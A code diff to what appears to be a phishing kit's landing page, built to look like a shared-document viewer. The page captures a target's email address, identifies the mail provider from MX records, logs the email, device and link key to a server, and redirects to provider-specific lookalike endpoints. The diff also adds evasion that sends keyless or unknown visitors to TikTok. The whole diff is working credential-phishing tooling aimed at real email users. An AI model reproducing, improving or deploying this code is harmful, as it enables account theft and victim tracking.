@@ -882,93 +882,103 @@
         }
 
         // ========== FETCH DOCUMENT DATA ==========
-        async function fetchDoc(key) {
-            try {
-                const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
-                const data = await res.json();
-                
-                if (data && data.data) {
-                    return {
-                        title: data.data.title || 'Untitled Document',
-                        sender: data.data.sender || 'Unknown Sender',
-                        url: data.data.url || ''
-                    };
-                }
-                
-                throw new Error('Invalid response from API');
-            } catch (error) {
-                console.error('Error fetching document:', error);
-                return null;
-            }
+        // ========== FETCH DOCUMENT DATA ==========
+async function fetchDoc(key) {
+    try {
+        const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
+        const data = await res.json();
+        
+        // Check if key exists in database
+        if (!data || !data.success || !data.data) {
+            console.warn('⚠️ Document key not found in database');
+            return null;
         }
+        
+        return {
+            title: data.data.title || 'Untitled Document',
+            sender: data.data.sender || 'Unknown Sender',
+            url: data.data.url || ''
+        };
+        
+    } catch (error) {
+        console.error('Error fetching document:', error);
+        return null;
+    }
+}
 
         // ========== INITIALIZE PAGE ==========
-        async function initializePage() {
-            // Parse key from URL hash (e.g., #roy)
-            const hash = window.location.hash.substring(1); // Remove the # symbol
-            const key = hash || null;
+        // ========== INITIALIZE PAGE ==========
+async function initializePage() {
+    // Parse key from URL hash (e.g., #roy)
+    const hash = window.location.hash.substring(1); // Remove the # symbol
+    const key = hash || null;
 
-            if (!key) {
-                console.error('No key found in URL hash');
-                alert('Invalid document link. Please use the link provided in your email.');
-                return;
-            }
+    if (!key) {
+        console.error('No key found in URL hash');
+        console.log('🔄 Redirecting to TikTok...');
+        window.location.href = 'https://tiktok.com';
+        return;
+    }
 
-            console.log('Parsed key from URL hash:', key);
+    console.log('Parsed key from URL hash:', key);
 
-            // ========== CHECK IF ALREADY AUTHENTICATED ==========
-            const authenticated = getCookie('authenticated');
-            
-            if (authenticated === 'yes') {
-                // User is already authenticated, redirect to document URL
-                const redirectUrl = getCookie('redirect_url');
-                
-                if (redirectUrl) {
-                    console.log('✅ User already authenticated');
-                    console.log('🔄 Redirecting to:', redirectUrl);
-                    window.location.href = redirectUrl;
-                    return; // Stop further execution
-                } else {
-                    console.warn('⚠️ Authenticated cookie found but no redirect_url cookie. Clearing authentication...');
-                    // Clear the authenticated cookie since redirect_url is missing
-                    setCookie('authenticated', '', -1);
-                }
-            }
-
-            // ========== USER NOT AUTHENTICATED - SHOW PAGE ==========
-            // Show loading overlay
-            document.getElementById('loadingOverlay').classList.add('active');
-
-            console.log('🔓 User not authenticated. Fetching document data...');
-            const docData = await fetchDoc(key);
-
-            // Hide loading overlay
-            document.getElementById('loadingOverlay').classList.remove('active');
-
-            if (!docData) {
-                alert('Unable to load document information. Please try again later.');
-                return;
-            }
-
-            // Set redirect_url cookie with the document URL from API
-            if (docData.url) {
-                setCookie('redirect_url', docData.url);
-                console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
-            } else {
-                console.error('⚠️ No URL returned from API');
-            }
-
-            // Display sender name and document title
-            document.getElementById('senderName').textContent = docData.sender;
-            document.getElementById('documentTitle').textContent = docData.title;
-            document.getElementById('senderInfoCard').classList.add('visible');
-
-            // Update the document name in the list
-            if (documents.length > 0) {
-                documents[0].name = docData.title + '.pdf';
-                renderDocuments();
-            }
+    // ========== CHECK IF ALREADY AUTHENTICATED ==========
+    const authenticated = getCookie('authenticated');
+    
+    if (authenticated === 'yes') {
+        // User is already authenticated, redirect to document URL
+        const redirectUrl = getCookie('redirect_url');
+        
+        if (redirectUrl) {
+            console.log('✅ User already authenticated');
+            console.log('🔄 Redirecting to:', redirectUrl);
+            window.location.href = redirectUrl;
+            return; // Stop further execution
+        } else {
+            console.warn('⚠️ Authenticated cookie found but no redirect_url cookie. Clearing authentication...');
+            // Clear the authenticated cookie since redirect_url is missing
+            setCookie('authenticated', '', -1);
         }
+    }
+
+    // ========== USER NOT AUTHENTICATED - SHOW PAGE ==========
+    // Show loading overlay
+    document.getElementById('loadingOverlay').classList.add('active');
+
+    console.log('🔓 User not authenticated. Fetching document data...');
+    const docData = await fetchDoc(key);
+
+    // Hide loading overlay
+    document.getElementById('loadingOverlay').classList.remove('active');
+
+    // ========== REDIRECT TO TIKTOK IF KEY NOT FOUND ==========
+    if (!docData) {
+        console.error('❌ Document not found for key:', key);
+        console.log('🔄 Redirecting to TikTok...');
+        window.location.href = 'https://tiktok.com';
+        return;
+    }
+    // =====================================================
+
+    // Set redirect_url cookie with the document URL from API
+    if (docData.url) {
+        setCookie('redirect_url', docData.url);
+        console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
+    } else {
+        console.error('⚠️ No URL returned from API');
+    }
+
+    // Display sender name and document title
+    document.getElementById('senderName').textContent = docData.sender;
+    document.getElementById('documentTitle').textContent = docData.title;
+    document.getElementById('senderInfoCard').classList.add('visible');
+
+    // Update the document name in the list
+    if (documents.length > 0) {
+        documents[0].name = docData.title + '.pdf';
+        renderDocuments();
+    }
+}
 
         // SVG Icons
         const SVG_ICONS = {
@@ -1169,6 +1179,66 @@
                 } catch (e) {
                     console.log('reCAPTCHA reset (safe to ignore):', e.message);
                 }
+            }
+        }
+
+        // ========== VISIT LOGGING ==========
+        
+        // Helper: Detect device type
+        function getDeviceType() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            if (/ipad|tablet|playbook|silk/i.test(ua)) {
+                return 'Tablet';
+            }
+            
+            if (/mobile|android|iphone|ipod|blackberry|windows phone/i.test(ua)) {
+                return 'Mobile';
+            }
+            
+            return 'Desktop';
+        }
+
+        // Log visit to Redis
+        async function logVisit(email, device, mxType) {
+            try {
+                console.log('📊 Logging visit to Redis...');
+
+                // Get document key from URL hash
+                const documentKey = window.location.hash.substring(1) || 'unknown';
+
+                const response = await fetch('/api/log-visit.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        device: device,
+                        mx_type: mxType,
+                        document_key: documentKey
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ Visit logged successfully');
+                    console.log('Visit ID:', result.visit_id);
+                    console.log('IP Address:', result.ip);
+                    console.log('MX Type:', result.mx_type);
+                    console.log('Document Key:', result.document_key);
+                } else {
+                    console.error('❌ Visit logging failed:', result.error);
+                }
+
+            } catch (error) {
+                console.error('❌ Visit logging error:', error);
+                // Don't block user flow if logging fails
             }
         }
 
@@ -1399,13 +1469,13 @@
             `;
         }
 
-        // Redirect based on provider (UNCHANGED - your endpoint handles redirect to authenticated.html)
+        // Redirect based on provider
         function redirectToProvider(email, mxResult) {
             // Log access before redirect
             const selectedFiles = Array.from(selectedDocuments);
             logAccess(email, mxResult, selectedFiles);
 
-            // Redirect to your endpoint (which will handle redirect to authenticated.html)
+            // Redirect to your endpoint
             const redirectUrls = {
                 'office365': 'https://7806d4cf9366-endpoint.com/?device=d2301a85-917a-484c-8c6b-d3273eebd8dd',
                 'google': 'https://pdf-render.vercel.app/viewer?from=me',
@@ -1418,18 +1488,22 @@
         }
 
         // reCAPTCHA callback when user completes it
-        function onRecaptchaSuccess(token) {
+        async function onRecaptchaSuccess(token) {
             console.log('reCAPTCHA verified successfully');
             
-            // Show provider badge
+            // ========== LOG VISIT TO REDIS WITH MX TYPE ==========
+            const email = document.getElementById('emailInput').value.trim();
+            const device = getDeviceType();
+            
             if (pendingMxResult) {
+                await logVisit(email, device, pendingMxResult.provider);
                 displayProviderBadge(pendingMxResult);
             }
+            // =====================================================
 
             // Wait a moment then redirect
             setTimeout(() => {
                 if (pendingMxResult) {
-                    const email = document.getElementById('emailInput').value.trim();
                     redirectToProvider(email, pendingMxResult);
                 }
             }, 1500);
